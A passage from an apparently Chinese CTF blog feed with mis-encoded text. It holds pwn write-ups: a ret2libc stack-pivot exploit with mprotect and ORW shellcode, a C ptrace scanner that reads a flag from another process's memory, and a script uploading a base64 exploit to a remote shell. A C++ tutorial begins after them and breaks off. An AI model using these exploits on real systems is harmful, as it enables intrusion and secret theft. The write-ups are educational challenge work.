ä¸ºæ²¡æœ‰å¼€ <code>canary</code> ï¼Œå› æ­¤è¿™é‡Œ <code>std::cin &gt;&gt; v4</code> åŒ…æ‹¬å¾€ <code>v3</code> ä¸­è¾“å…¥æ•°æ®éƒ½æ˜¯å­˜åœ¨æ ˆæº¢å‡ºçš„ã€‚</p><p>æ‰€ä»¥å¸¸è§„æ‰“ä¸€ä¸ª <code>ret2libc</code> å³å¯ï¼Œç„¶åç¨‹åºç¦ç”¨äº† <code>execve</code> ï¼Œæœ€åå»æ‰§è¡Œ <code>orw</code> </p><h4 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h4><p>è¿™é‡Œè¦è¯´æ˜ä¸€ç‚¹ï¼Œæœ¬é¢˜è¦å†æ¬¡è¾“å…¥çš„è¯ï¼Œè¦åˆ©ç”¨ <code>cin &gt;&gt;</code> æ¥å®ç°ï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯éœ€è¦æ§åˆ¶ä¸¤ä¸ªå‚æ•°çš„ï¼Œç¬¬ä¸€ä¸ªæ˜¯ <code>std::cin</code> çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯å†™å…¥æ•°æ®çš„ç›®æ ‡åœ°å€ã€‚è€Œæ‰§è¡Œçš„åœ°æ–¹ä¸º</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112245220.png" alt="image-20230111224545172"></p><p>æœ‰ä¸€ç‚¹åƒ <code>scanf</code> å‡½æ•°ï¼Œç„¶åå°±æ˜¯å…ˆæ³„éœ² <code>libc</code> åœ°å€ï¼ŒåŒæ—¶æ§åˆ¶ <code>rbp</code> çš„å€¼ä¸ºæ¥ä¸‹æ¥çš„æ ˆè¿ç§»åšä¸€ä¸ªå‡†å¤‡ï¼Œå†åšä¸€ä¸ªå¾€ <code>bss</code> æ®µä¸Šè¾“å…¥çš„ <code>rop</code> ï¼Œæœ€åç»™ä¸€ä¸ª <code>leave ; ret</code> è§¦å‘æ ˆè¿ç§»ã€‚å‡†å¤‡å¾€ <code>bss</code> æ®µä¸Šå†™çš„ <code>rop</code> æ˜¯åœ¨å·²ç»æœ‰äº† <code>libc</code> åœ°å€çš„æƒ…å†µä¸‹åšçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å»è°ƒç”¨ <code>mprotect</code> å‡½æ•°å°† <code>bss</code> æ®µæ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œåé¢ç´§è·Ÿç€æ‰§è¡Œ <code>orw</code> çš„ <code>shellcode</code>ã€‚</p><p>å…¶å®æ³„éœ²çš„ <code>libc</code> åœ°å€å°±ä¸€ä¸ªç”¨å¤„ï¼Œå°±æ˜¯ä» <code>libc</code> ä¸­å–äº†ä¸€ä¸ª <code>pop rdx ; ret</code> è¿™ä¸ª <code>gadget</code> </p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ <code>orw</code> ä¹‹å‰å¿…é¡»è¦å…ˆæŠŠæ ‡å‡†è¾“å…¥ç»™ <code>close</code> æ‰ã€‚ä¹Ÿå°±æ˜¯å…ˆæ‰§è¡Œ <code>close(1)</code> å† <code>open</code> <code>read</code> <code>write</code>  ä¸ç„¶è¿œç¨‹æ‰“å°ä¸å‡ºæ¥ <code>flag</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;61.147.171.105:61597&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000406301</span></span><br><span class="line">cin_addr=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span> </span><br><span class="line">bss_addr=<span class="number">0x609530</span></span><br><span class="line">leave_addr=<span class="number">0x40223A</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+p64(bss_addr-<span class="number">8</span>)+p64(<span class="number">0x40223B</span>)+p64(pop_rdi)+p64(e.got[<span class="string">&#x27;mprotect&#x27;</span>])+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(cin_addr)+p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(use_cin)+p64(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name: &quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4021D8</span>,<span class="number">0x401C30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password: &quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">mprotect_addr=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=mprotect_addr-libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;mprotect_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(pop_rdi)+p64(bss_addr&amp;<span class="number">0xfff000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x48</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301120046474.png" alt="image-20230112004628191"></p><h2 id="injection2-0"><a href="#injection2-0" class="headerlink" title="injection2.0"></a>injection2.0</h2><p>è¿™ç§ç±»å‹çš„é¢˜ç›®æ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œè·Ÿç€å®˜æ–¹çš„ <code>WP</code> å¤ç°ä¸€ä¸‹ã€‚</p><h3 id="æ–‡ä»¶åˆ†æ"><a href="#æ–‡ä»¶åˆ†æ" class="headerlink" title="æ–‡ä»¶åˆ†æ"></a>æ–‡ä»¶åˆ†æ</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131110883.png" alt="image-20230113111031792"></p><p>ç»™çš„æ–‡ä»¶æ˜¯ä¸Šé¢è¿™äº›ï¼Œ <code>rootfs.img</code> æ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜ åƒæ–‡ä»¶ï¼Œå®ƒæ˜¯å°† <code>_install</code> æ–‡ä»¶è¿›è¡Œäº†æ‰“åŒ…ã€‚æ‰€ä»¥è¿™é‡Œæ˜¯ç”¨ <code>qemu</code> æ¥æ¨¡æ‹Ÿçš„ï¼Œåœ¨ <code>_install</code> æ–‡ä»¶ä¸­ <code>init</code> ä½œä¸º <code>qemu</code> çš„åˆå§‹åŒ–è„šæœ¬ã€‚</p><p><code>init</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># ä¿®æ”¹ uid gid ä¸º 0 ä»¥ææƒ /bin/sh è‡³ rootã€‚</span></span></span><br><span class="line">poweroff -f # è®¾ç½® shell é€€å‡ºååˆ™å…³é—­æœºå™¨</span><br></pre></td></tr></table></figure><p>è€Œå…³é”®æ˜¯åœ¨ä¸‹é¢ä¸‰å¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥æ˜¯å…³é—­äº† <code>linux</code> å†…æ ¸ä¸­çš„ <code>ptrace</code> é™åˆ¶ã€‚<code>ptrace</code> æ˜¯ä¸€ç§ <code>linux</code> å†…æ ¸ä¸­çš„è¿›ç¨‹è°ƒè¯•åŠŸèƒ½ï¼Œä»–å¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹è·Ÿè¸ªå¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œæƒ…å†µï¼Œè·Ÿè¸ªè¿›ç¨‹å¯ä»¥è®¿é—®è¢«è·Ÿè¸ªè¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œå¯„å­˜å™¨çš„å€¼ã€‚ä¸ºäº†é˜²æ­¢æ¶æ„ç¨‹åºåˆ©ç”¨ <code>ptrace</code> è¿›è¡Œæ”»å‡»ï¼Œ<code>Linux</code> å†…æ ¸å¼€å‘è€…åœ¨å†…æ ¸å¼•å…¥äº† <code>yama</code> çš„å®‰å…¨æœºåˆ¶ï¼Œå…¶ä¸­çš„ä¸€ä¸ªå­æ¨¡å— <code>ptrace_scope</code> å°±æ˜¯ç”¨æ¥é™åˆ¶ <code>ptrace</code> ä½¿ç”¨çš„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>yama</code> çš„ <code>ptrace_scope</code> è¢«è®¾ç½®ä¸º <code>1</code> ï¼Œè¿™æ„å‘³ç€åªæœ‰å½“çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹å±äºåŒä¸€ç”¨æˆ·æ—¶ï¼Œæ‰èƒ½è·Ÿè¸ªå­è¿›ç¨‹ï¼Œ<strong>å¦‚æœè®¾ç½®ä¸º <code>0</code> å°±æ˜¯å…³é—­è¿™ä¸ªé™åˆ¶ï¼Œä»»ä½•è¿›ç¨‹éƒ½å¯ä»¥è·Ÿè¸ªå…¶ä»–è¿›ç¨‹</strong>ã€‚</p><p>ç¬¬äºŒå¥æ˜¯è¿è¡Œ <code>target</code> ç¨‹åºï¼Œå¹¶å°†ç¨‹åºçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° <code>pso.file</code> æ–‡ä»¶ï¼Œå¹¶å°†è¯¥è¿›ç¨‹è®¾ç½®ä¸ºåå°è¿›ç¨‹ã€‚</p><p>ç¬¬ä¸‰å¥æ˜¯è„±ç¦»åŸå…ˆçš„ç»ˆç«¯ï¼Œå¹¶è·å– <code>root</code> æƒé™</p><p>ç„¶å <code>target</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131739623.png" alt="image-20230113173903535"></p><p>å…ˆå°† <code>flag</code> æ–‡ä»¶è¯»å…¥åˆ°æ ˆä¸Šï¼Œç„¶å <code>close</code> å°†ä¸‰ä¸ªæ–‡ä»¶æµå…¨éƒ¨å…³é—­ï¼Œå†å°† <code>flag</code> æ–‡ä»¶åˆ é™¤æ‰ï¼Œæœ€åæœ‰ä¸€ä¸ªæ°¸çœŸå¾ªç¯ï¼Œä¸æ–­æ‰“å°ä¼‘çœ æ‰“å°å­—ç¬¦ä¸²ï¼ˆç›®çš„æ˜¯è®©è¿›ç¨‹ä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œä¸ä¼šç»“æŸï¼‰</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å› ä¸ºå°† <code>/proc/sys/kernel/yama/ptrace_scope</code> è®¾ç½®ä¸ºäº† <code>0</code>,å¹¶ä¸”æƒé™ä¸º <code>root</code> ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨ <code>ptrace</code> æ¥å£æ¥è®¿é—®è¿›ç¨‹çš„å†…å­˜ã€‚</p><p>é¦–å…ˆæ‰§è¡Œå‘½ä»¤ <code>ps -ef</code> è·å–è¿›ç¨‹çš„ <code>PID</code> ï¼Œå†ç”¨ <code>/proc/pid/maps</code> è·å–æ ˆåœ°å€ï¼Œå› ä¸ºæ­¤æ—¶çš„è¿›ç¨‹ä¾ç„¶åœ¨è¿è¡Œï¼Œæ‰€ä»¥ <code>flag</code> ä¾ç„¶å­˜åœ¨åˆ°æ ˆä¸Šï¼Œè°ƒç”¨ <code>ptrace</code> è·å–æ ˆå†…æ•°æ®æ¯”å¯¹ <code>flag</code> ï¼Œæ¯”å¯¹æˆåŠŸçš„è¯ï¼Œå°±å°†æ¥ä¸‹æ¥å†…å­˜ä¸­çš„æ•°æ®æ‰“å°å‡ºæ¥ï¼Œä»è€Œè·å– <code>flag</code> ã€‚</p><p>è€Œä¸Šé¢æ‰€è¯´çš„æ¯”å¯¹å¹¶æ‰“å° <code>flag</code> éœ€è¦ç”¨Cè¯­è¨€çš„è„šæœ¬æ¥å®ç°ï¼Œå› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ç›®ï¼Œæ‰€ä»¥ç›´æ¥æŠŠå®˜æ–¹çš„ <code>WP</code> ä¸­çš„ <code>exp</code> è´´åˆ°è¿™é‡Œäº†ï¼ˆä¸»è¦æ„Ÿè§‰è¿™ç§è½®å­æ²¡å¿…è¦å†å»è‡ªå·±å†™ä¸€ä¸ªï¼Œç›´æ¥ç”¨æˆ–è€…æ ¹æ®éœ€æ±‚å†æ”¹æ”¹å°±æŒºå¥½ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="comment">//cat /proc/131/maps</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argv , <span class="type">char</span> **argc)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> data ;</span><br><span class="line">  <span class="type">int</span> stat ;</span><br><span class="line">  <span class="type">int</span> pid = atoi(argc[<span class="number">1</span>]) ;<span class="comment">//è¿™é‡Œéœ€è¦æ‰‹åŠ¨ä¼ å…¥å‘½ä»¤è¡Œå‚æ•° targetçš„pid</span></span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) ;</span><br><span class="line">  wait(&amp;stat) ;    <span class="comment">// å¦‚æœä¸waitï¼Œé©¬ä¸Šè¿›è¡Œä¸‹ä¸€ä¸ªptraceçš„PEEKæ“ä½œä¼šé€ æˆ no such process é”™è¯¯</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0</span> ;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">  <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">  &#123;</span><br><span class="line">    data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    <span class="comment">// ä¸€æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr) ;</span><br><span class="line">      <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">      <span class="type">char</span> data1;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        addr1+=<span class="number">1</span>;</span><br><span class="line">        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//write(1,data1,0x10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªè„šæœ¬æˆ‘ä»¬æ˜¯æ— æ³•åœ¨è¿œç¨‹çš„ç¯å¢ƒä¸Šç¼–å†™å¹¶ç¼–è¯‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åœ¨æœ¬åœ°ç¼–è¯‘å¥½ï¼Œç„¶åç”¨ <code>python</code> è„šæœ¬å°† <code>exp</code> è¿›è¡Œ <code>base64</code> ç¼–ç ï¼Œç„¶åä¸Šä¼ åˆ°è¿œç¨‹ç¯å¢ƒã€‚</p><p><code>python</code> è„šæœ¬å¦‚ä¸‹ï¼š</p><p>è¿™ä¸ªä¾ç„¶æ˜¯å®˜æ–¹çš„ <code>python</code> è„šæœ¬ã€‚ä½œç”¨å°±æ˜¯å°† <code>exp</code> ä¸Šä¼ åˆ°è¿œç«¯ç¯å¢ƒä¸­ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./boot.sh&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">61265</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">exp</span>):</span><br><span class="line">    p = log.progress(<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+exp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">600</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot;</span> % (encoded[i:i+<span class="number">600</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">&quot;cat /tmp/benc | base64 -d &gt; /tmp/exp&quot;</span>)</span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line">upload(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131842540.png" alt="image-20230113184223347"></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#injection2-0%F0%9F%92%89">æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP | xia0ji233â€™s blog</a></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> æ²™ç®± </tag>
            
            <tag> C++ </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
            <tag> è¿›ç¨‹æ³¨å…¥ </tag>
            
            <tag> ä¸Šä¼ è„šæœ¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ å¸¸è§æœ¯è¯­&amp;&amp;åŸºç¡€æ¦‚å¿µçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/4320fd7a.html"/>
      <url>/posts/4320fd7a.html</url>
      
        <content type="html"><![CDATA[<p>ç®€å•å…¥é—¨äº†ä¸€ä¸‹ C++ ï¼Œå­¦ä¹ äº†å‡ å¤©ï¼Œå¤§æ¦‚æ¸…æ¥šäº†è¿™äº›å¸¸ç”¨çš„æœ¯è¯­å’ŒåŸºç¡€æ¦‚å¿µï¼Œè™½ç„¶è¿™å¯¹ <code>PWN</code> ä¸­çš„ C++ é¢˜ç›®é€†å‘å¸®åŠ©å®åœ¨ä¸å¤§ï¼Œä½†å¥½å¥‡å¿ƒæ€»æ˜¯é©±ä½¿ç€æˆ‘å°è¯•å¼„æ‡‚å®ƒä»¬ã€‚æ„Ÿè°¢ <code>winmt</code> å¸ˆå‚…åœ¨æˆ‘è¿™éƒ¨åˆ†çš„å­¦ä¹ ä¸­ï¼Œè§£æƒ‘æˆ‘çš„ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</p><h3 id="ä»è¾“å‡ºhello-worldå¼€å§‹"><a href="#ä»è¾“å‡ºhello-worldå¼€å§‹" class="headerlink" title="ä»è¾“å‡ºhello worldå¼€å§‹"></a>ä»è¾“å‡ºhello worldå¼€å§‹</h3><p>åœ¨ C++ ä¸­å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç æ¥è¾“å‡º<code>hello world</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iostream</code> è¿™ä¸ªå¤´æ–‡ä»¶å®šä¹‰äº†è¾“å…¥è¾“å‡ºæµçš„ç›¸å…³ç±»å‹å’Œå‡½æ•°ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆä¸æ˜¯<code>#include&lt;iostream.h&gt;</code> å‘¢ï¼Œå› ä¸ºåœ¨ C++ 11 æ ‡å‡†åï¼Œ<strong>æ ‡å‡†åº“çš„å¤´æ–‡ä»¶</strong>å°±ä¸å†ä½¿ç”¨ <code>.h</code> ä½œä¸ºåç¼€äº†ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯èƒ½å¤Ÿæ›´å¥½çš„åŒºåˆ†æ ‡å‡†åº“çš„å¤´æ–‡ä»¶å’Œç”¨æˆ·è‡ªå®šä¹‰çš„å¤´æ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬è‡ªå·±å†™äº†ä¸€ä¸ªåä¸º <code>iostream.h</code> çš„å¤´æ–‡ä»¶ï¼Œå°±å¯ä»¥ä½¿ç”¨ <code>#include&lt;iostream.h&gt;</code> æ¥åŒ…å«è¿™ä¸ªå¤´æ–‡ä»¶ï¼Œè€Œä¸ä¼šå’Œæ ‡å‡†åº“çš„ <code>&lt;iostream&gt;</code> å¤´æ–‡ä»¶å†²çªã€‚</p><p>æ­¤å¤„è¾“å‡º <code>hello world\n</code> æ˜¯ <code> std::cout &lt;&lt; &quot;hello world&quot;</code>è¿™éƒ¨åˆ†æ¥å®ç°çš„ï¼Œè€Œåé¢ <code>\n</code> åˆ™æ˜¯ <code>&lt;&lt; std ::endl</code>æ¥å®ç°çš„ã€‚ <code>std</code>æ˜¯æ ‡å‡†å‘½åç©ºé—´ï¼Œç”¨äºåŒºåˆ†ä¸åŒç¬¦å·åç§°çš„æœºåˆ¶ï¼Œåœ¨ C++ æ ‡å‡†åº“ä¸­ï¼Œæ‰€æœ‰ç±»å‹å’Œå‡½æ•°éƒ½è¢«å®šä¹‰åˆ°äº†æ ‡å‡†å‘½åç©ºé—´ï¼ˆä¹Ÿå°±æ˜¯ <code>std</code> ï¼‰ è¡¥å……ï¼š å¦‚æœåœ¨ mainå‡½æ•°ä¹‹å‰å†™å…¥ <code>using namespace std</code> é‚£ä¹ˆä¹‹åå‡ºç°å±äº <code>std</code> ä¸­çš„å¯¹è±¡å°±ä¸å¿…åœ¨å‰é¢åŠ å…¥ <code>std::</code>äº†ï¼Œä½†é€šå¸¸æˆ‘ä»¬ä¸è¿™ä¹ˆåšï¼Œå°½ç®¡è¿™æ ·çœ‹èµ·æ¥å¯èƒ½å¾ˆç®€æ´ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå…¨å›½æœ‰å¾ˆå¤šä¸ªå¼ ä¸‰ï¼Œä¸ºäº†åŒºåˆ†è¿™äº›å¼ ä¸‰æˆ‘ä»¬å¯ä»¥ç»™æ¯ä¸ªå¼ ä¸‰éƒ½åŠ ä¸€ä¸ªå‰ç¼€ï¼Œæ¯”å¦‚æ²³å—çš„å¼ ä¸‰ï¼ŒåŒ—äº¬çš„å¼ ä¸‰ï¼Œè¿™ä¸ªå‰ç¼€ä¹Ÿå°±æ˜¯ä¸åŒçš„å‘½åç©ºé—´äº†ã€‚</p><p><u>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ª <code>std::cout</code> <strong>è¾“å‡ºæµå¯¹è±¡</strong>æ¥è¾“å‡ºå†…å®¹</u>ï¼Œè¿™ä¸ªè¾“å‡ºæµå¯¹è±¡å°±æ˜¯å®šä¹‰åœ¨ <code>std</code> ä¸­çš„ã€‚è€Œ <code>&lt;&lt;</code> æ˜¯ä¸€ä¸ªæµæ’å…¥è¿ç®—ç¬¦ï¼Œå°†æ•°æ®è¾“å‡ºåˆ°æµä¸­ã€‚ <code>std::cout &lt;&lt; &quot;hello world&quot; </code> å¯ä»¥ç†è§£ä¸ºå°†å­—ç¬¦ä¸² <code>â€hello world&quot;</code> æµå‘<code>std::cout</code> è¿™ä¸ªè¾“å‡ºæµï¼Œä»è€Œè¿›è¡Œäº†è¾“å‡ºã€‚ <code>&lt;&lt;</code> æ˜æ˜æ˜¯å·¦ç§»è¿ç®—ç¬¦ï¼Œä½†è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯æµæ’å…¥è¿ç®—ç¬¦å‘¢ï¼Ÿè¿™æ˜¯å› 